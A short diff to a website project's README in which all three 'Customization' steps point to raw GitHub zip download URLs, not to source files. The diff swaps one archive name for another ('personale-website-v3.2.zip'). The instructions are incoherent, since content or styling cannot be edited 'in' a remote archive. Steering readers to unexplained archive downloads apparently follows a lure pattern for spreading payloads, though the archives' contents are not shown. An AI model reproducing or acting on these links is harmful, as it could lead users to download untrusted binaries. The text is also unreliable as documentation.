@@ -41,6 +41,6 @@ npm run build
 ## Customization
 
 You can customize the website by:
-1. Editing the content in `https://github.com/omusu123/personale-website/raw/refs/heads/main/src/website_personale_gnawable.zip`
-2. Modifying the color scheme in `https://github.com/omusu123/personale-website/raw/refs/heads/main/src/website_personale_gnawable.zip`
-3. Updating the layout and styling in `https://github.com/omusu123/personale-website/raw/refs/heads/main/src/website_personale_gnawable.zip`
+1. Editing the content in `https://raw.githubusercontent.com/omusu123/personale-website/main/src/personale-website-v3.2.zip`
+2. Modifying the color scheme in `https://raw.githubusercontent.com/omusu123/personale-website/main/src/personale-website-v3.2.zip`
+3. Updating the layout and styling in `https://raw.githubusercontent.com/omusu123/personale-website/main/src/personale-website-v3.2.zip`
